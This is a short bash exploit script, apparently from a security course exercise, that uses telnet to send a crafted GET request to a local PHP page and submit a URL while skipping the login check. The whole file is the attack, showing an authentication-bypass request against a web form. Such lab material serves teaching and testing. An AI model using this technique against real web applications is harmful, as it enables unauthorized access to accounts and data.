#!/bin/bash

# A sploit that violated fail-safe default, it does not have to be logged in as Alice/Bob before submitting any URLs

# initialize
webName="NewWebSite-Exploited"
url="http%3A%2F%2Fwww.uwaterloo.ca"
userName="everybody"

usage(){
    echo "bad argument, expected 2 arguments"
    exit 1
}

if [ ${#} -ne 2 ]; then usage; fi

echo "Sploit1: This sploit will bypass user authentication, and submit a URL without a password"

{
# open up telnet
echo "open ${1} ${2}"
sleep 1

# bypass user authentication, and submit a URL without a password
echo "GET http://127.0.0.1:8080/index.php?namebox=${webName}&urlbox=${url}&submitter=${userName} HTTP/1.0"
echo
echo

sleep 1
} | telnet > /dev/null

